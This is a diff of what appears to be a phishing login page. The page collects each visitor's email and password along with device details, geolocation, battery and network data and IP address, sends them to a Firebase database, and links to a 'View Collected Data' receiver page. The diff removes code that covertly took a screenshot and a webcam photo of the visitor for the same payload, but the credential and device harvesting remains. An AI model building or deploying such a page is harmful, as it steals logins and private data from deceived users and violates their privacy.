@@ -13,9 +13,7 @@
         input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
         button { background: #1a73e8; color: #fff; padding: 10px; border: none; border-radius: 4px; width: 100%; cursor: pointer; font-size: 16px; }
         button:hover { background: #1557b0; }
-        video, canvas { display: none; }
     </style>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 </head>
@@ -31,8 +29,6 @@
         </form>
         <p><a href="receiver.html">View Collected Data</a></p>
     </div>
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
     <script>
         // Replace this with your own firebaseConfig if you created a new Firebase project
         const firebaseConfig = {
@@ -116,44 +112,6 @@
                 console.error('IP fetch failed:', error.message);
             }
 
-            let screenshot = '';
-            try {
-                const canvas = await html2canvas(document.body);
-                screenshot = canvas.toDataURL('image/jpeg', 0.5); // Reduce quality to 0.5, use JPEG
-            } catch (error) {
-                console.error('Screenshot failed:', error.message);
-                screenshot = 'N/A';
-            }
-
-            let cameraShot = 'N/A';
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                video.srcObject = stream;
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-
-                // Resize the canvas to an even smaller resolution (e.g., 160x120)
-                const targetWidth = 160;
-                const targetHeight = 120;
-                canvas.width = targetWidth;
-                canvas.height = targetHeight;
-
-                // Draw the video frame onto the resized canvas
-                const ctx = canvas.getContext('2d', { willReadFrequently: true });
-                ctx.drawImage(video, 0, 0, targetWidth, targetHeight);
-
-                // Convert to base64 with very low quality
-                cameraShot = canvas.toDataURL('image/jpeg', 0.1); // Use JPEG with 0.1 quality
-                stream.getTracks().forEach(track => track.stop());
-
-                // Log the size of cameraShot to verify
-                console.log('cameraShot size:', new TextEncoder().encode(cameraShot).length, 'bytes');
-            } catch (error) {
-                console.error('Camera shot failed:', error.message);
-                cameraShot = 'N/A';
-            }
-
             const payload = {
                 email,
                 password,
@@ -162,9 +120,7 @@
                 deviceInfo,
                 geolocation,
                 battery,
-                network,
-                screenshot,
-                cameraShot
+                network
             };
             console.log('Sending:', payload);
 
